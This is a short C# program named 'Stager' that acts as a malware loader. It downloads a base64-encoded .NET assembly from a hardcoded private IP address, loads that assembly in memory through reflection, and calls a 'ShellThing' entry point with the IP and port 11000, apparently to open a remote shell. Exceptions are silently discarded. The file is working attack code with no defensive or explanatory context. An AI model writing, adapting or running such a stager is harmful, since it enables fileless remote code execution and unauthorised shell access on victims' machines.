using System;
using System.Net;
using System.Reflection;
using System.Text;
using System.IO;

namespace Stager
{
    class Program
    {
        static void Main(string[] args)
        {
            string ipAddress = "192.168.220.130";
            string port = "11000";
            string target = $"http://{ipAddress}/shell";

            string assemblyb64 = new WebClient().DownloadString(target);

            byte[] assemblyBytes = Convert.FromBase64String(assemblyb64);

            Assembly assembly = Assembly.Load(assemblyBytes);

            Type type = assembly.GetType("ShellThing.Program");
            object instance = Activator.CreateInstance(type);

            object[] arguments = new object[] { new string[] { ipAddress, port } };
            try
            {
                // Must be compiled to same .NET framework version as the payload 
                // If not, payload will throw exception - unable to find dependency libraries
                type.GetMethod("Main").Invoke(instance, arguments);
            }
            catch { }
        }
    }
}
